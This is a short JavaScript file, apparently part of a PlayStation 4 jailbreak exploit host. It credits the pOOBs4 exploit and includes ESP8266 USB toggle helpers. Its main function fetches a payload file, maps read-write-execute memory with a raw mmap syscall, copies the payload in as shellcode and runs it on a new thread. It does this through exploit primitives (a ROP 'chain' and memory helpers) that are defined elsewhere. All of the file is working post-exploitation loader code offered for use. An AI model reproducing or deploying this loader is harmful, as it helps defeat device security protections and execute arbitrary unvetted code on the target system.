// original exploit: https://github.com/ChendoChap/pOOBs4

var usbWaitTime = sessionStorage.getItem('waittime');

if (!usbWaitTime)
{
  usbWaitTime = 2500; //default if empty
}

function showMessage(msg) {
  document.getElementById("message").innerHTML = msg;
  document.getElementById("message").style.display='block';
}

//ESP8266 usb functions - stooged
function disableUSB() {
  var getpl = new XMLHttpRequest();
  getpl.open("POST", "./usboff", true);
  getpl.send(null);
}

function enableUSB() {
  var getpl = new XMLHttpRequest();
  getpl.open("POST", "./usbon", true);
  getpl.send(null);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function toogle_payload(){
var req = new XMLHttpRequest();
req.responseType = "arraybuffer";
req.open("GET",PLfile,true);
 req.send();
 req.onreadystatechange = function () {
  if (req.readyState == 4) {
   PLD = req.response;
   var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
   var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
   tmp.set(new Uint8Array(req.response), 0);
   tmp.set(padding, req.response.byteLength);
   var shellcode = new Uint32Array(tmp.buffer);
   pl.set(shellcode,0);
   var pthread = p.malloc(0x10);
   chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
   awaitpl();
  }
 };
}